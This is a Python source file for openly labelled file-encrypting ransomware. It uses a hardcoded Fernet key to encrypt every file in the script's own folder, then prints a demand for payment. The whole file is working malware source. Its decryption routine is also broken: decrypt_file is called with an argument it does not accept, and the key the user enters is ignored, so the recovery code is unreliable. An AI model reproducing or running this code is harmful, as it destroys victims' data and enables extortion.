import logging
import os
import sys
from cryptography.fernet import Fernet


class Ransomware:
    """ This class represents file encrypting ransomware.
    """

    def __init__(self, name):
        self._name = name
        self.key = None

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def generate_key(self):
        """ Generate a new key for encryption. """
        self.key = b'acQ5C5fcebnyMEBlZ3nkrpM-ynUmFSe4d9aMRiEz394='

    def ransom_user(self):
        """ Inform user about encryption of his files. """
        print(
            "Hi, all your files have been encrypted. Please "
            "send 0.1 USD to this address to get decryption "
            "key: XYZ."
        )

    def encrypt_file(self, filename):
        """ Encrypt the given file with Fernet encryption algorithm.
        :param str filename: Name of the file.
        """
        with open(filename, 'rb') as file:
            content = file.read()

        fernet = Fernet(self.key)
        encrypted_data = fernet.encrypt(content)

        with open(filename, 'wb') as file:
            file.write(encrypted_data)

    def decrypt_file(self, filename):
        """ Decrypt the given file with Fernet encryption algorithm.
        :param str filename: Name of the file.
        """
        with open(filename, 'rb') as file:
            content = file.read()

        fernet = Fernet(self.key)
        decrypted_data = fernet.decrypt(content)

        with open(filename, 'wb') as file:
            file.write(decrypted_data)

    def get_files_in_folder(self, path):
        """ Returns a `list` of all files in the folder.

        :param str path: Path to the folder
        """
        files = []
        for file in os.listdir(path):
            if os.path.isfile(os.path.join(path, file)):
                files.append(os.path.join(path, file))

        return files

    def encrypt_files_in_folder(self, path):
        """ Encrypt all files in the given directory specified by path.

        :param str path: Path of the folder to be encrypted.
        :returns: Number of encrypted files (`int`).
        """
        self.generate_key()
        num_encrypted_files = 0
        files = self.get_files_in_folder(path)

        for file in files:
            logging.debug('Encrypting file: {}'.format(file))
            self.encrypt_file(file)
            num_encrypted_files += 1

        self.ransom_user()
        return num_encrypted_files

    def decrypt_files_in_folder(self, path):
        """ Decrypt all files in the given directory specified by path.

        :param str path: Path of the folder to be decrypted.
        """
        key = input("Enter decryption key: ").encode()
        fernet = Fernet(key)
        
        files = self.get_files_in_folder(path)

        for file in files:
            try:
                self.decrypt_file(file, fernet)
            except Exception as e:
                logging.error(f"Error decrypting {file}: {e}")

        print("Decryption completed.")


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    ransomware = Ransomware('SimpleRansomware')
    path = os.path.dirname(os.path.abspath(__file__))

    number_encrypted_files = ransomware.encrypt_files_in_folder(path)
    print('Number of encrypted files: {}'.format(number_encrypted_files))

    ransomware.decrypt_files_in_folder(path)

